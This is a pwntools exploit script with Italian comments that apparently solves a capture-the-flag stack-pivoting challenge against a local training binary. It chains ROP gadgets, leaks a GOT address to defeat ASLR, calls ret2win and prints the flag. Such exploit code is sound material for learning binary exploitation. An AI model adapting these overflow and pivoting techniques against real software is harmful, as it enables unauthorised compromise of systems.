from pwn import *
from pprint import pprint
import warnings
# import logging
# import coloredlogs

# coloredlogs.install()

warnings.filterwarnings("ignore")
# context.binary = elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')

offset = 40
pop_rdi_gadget = int(hex(0x00400a33),0)
pop_rsp_gadget = int(hex(0x00400a2d),0)
pop_rax_gadget = int(hex(0x004009bb),0)
xchg_raxrsp_gadget = int(hex(0x004009bd),0)
mov_raxmrax_gadget = int(hex(0x004009c0),0)
add_raxrbp_gadget = int(hex(0x004009c4),0)
add_rsp = int(hex(0x004006b2),0)
call_rax = int(hex(0x004006b0),0)

# context.log_level = 'debug'

def set_env(binary,library) : # funzione per settare i principali parametri del sistema
    
    elf = context.binary = ELF(binary)
    libc = ELF(library)
    p = elf.process()
    rop = ROP(elf)
    return elf, p, rop, libc
    
def pivoting_stack(idx_pivot): # funzione che crea una chain per dirottare lo stack ad un indirizzo da noi specificato (scambia contenuto di rsp)
    
    rop.raw(pop_rax_gadget) # pop rax; ret; carichiamo l'indirizzo su cui risiedere il nostro stack fittizzio con la rop chain che abbiamo mandato prima
    rop.raw(idx_pivot) # mettiamo nello chain l'indirizzo su cui punterà poi rsp, per fare il pivoting
    rop.raw(xchg_raxrsp_gadget) # xchg rax, rsp; ret; viene scambiato il contenuto di rax con quello di rsp, così rsp punterà ora all'indirizzo specificato
                                # da noi 

def send_payload(w_off) :  # se w_off è true viene aggiunto al payload l'offset per mandare in overflow il buffer
    
    if w_off : 
        payload = [ 
            b"A" * offset,
            rop.chain()
        ]   
    else : 
        payload = [ 
            rop.chain()
        ]   
    payload = b"".join(payload)
    p.send(payload)

# *--------------------- ENV SET ---------------------*

elf, p, rop, libc = set_env('./pivot', "./libpivot.so") # setting del sistema

# *---------------------  START  ---------------------*

# debug
# gdbscript = "b *main"
# pid = gdb.attach(p, gdbscript=gdbscript)

# pprint(elf.symbols)
x = 1

# *------------------  1 : 1 chain  ------------------*
log.warning(f"Questa è la {x}° chain, chiamo foothold_function() così da aggiornare la entry della tabella got.plt")
p.recvuntil("t: ")
stack_pivot = int(p.recvline().rstrip().decode('utf-8'),16)
p.recvline() # Send a ROP chain now and it will land there\n'

rop = ROP(elf)                              # sono presenti più puts del necessario perchè a volte è necessario chiamare una istruzione ret prima di richiamare un'altra
rop.raw(elf.plt["foothold_function"])       # funzione per
rop.raw(elf.symbols["puts"])
rop.raw(pop_rdi_gadget)
rop.raw(elf.got["foothold_function"])
rop.raw(elf.symbols["puts"])
rop.raw(elf.symbols["puts"])
rop.raw(elf.symbols["main"])

send_payload(False)

p.recvuntil("smash\n") # Now please send your stack smash\n'

# *------------------  2 : 2 chain  ------------------*

rop = ROP(elf)      

pivoting_stack(stack_pivot)

send_payload(True)

print(p.recvuntil("pivot\n")) # foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot\n'
print(p.recvline())
foothold = u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00")) # foothold got.plt

log.info(f"Identificato l'indrizzo in memoria della funzione foothold_function (entry got.plt) : {hex(foothold)}")

# *------------------  3 : 1 chain  ------------------*
x += 1
log.warning(f"Questa è la {x}° chain, chiamo la funzione ret2win aggiungendo l'offset e calcolando l'indirizzo effetivo di foothold")
p.recvuntil("pivot: ")
stack_pivot = int(p.recvline().rstrip().decode('utf-8'),16)
p.recvline() # Send a ROP chain now and it will land there\n'

ret2win_off = libc.symbols["ret2win"] - libc.symbols["foothold_function"]  # offset tra posizione di foothold_function e ret2win nella libreria
ret2win = foothold + ret2win_off  # indirizzo effettivo in memoria della funzione ret2win, caloclato aggiungendo all'offset calcolaro sopra l'indirizzo 
                                  # effettivo (in got.plt , quindi l'indirizzo inserito nella tabella dopo la prima chiamata) di foothold_function
rop = ROP(elf)
rop.raw(ret2win)

send_payload(False)

log.info(f"Calcolato l'offset tra ret2win e foothold_function nella libpivot.so : {hex(ret2win_off)}")
log.info(f"Calcolato l'indirizzo in memoria della funzione ret2win : {hex(ret2win)}")

p.recvuntil("smash\n") # Now please send your stack smash\n'

# *------------------  4 : 2 chain  ------------------*

rop = ROP(elf) 
pivoting_stack(stack_pivot)

send_payload(True)

p.recvline() # Thank you!\n'

flag = p.recvline()
log.critical(f"Questa è la flag : {flag.decode('utf-8')}")

# *------------------      END      ------------------*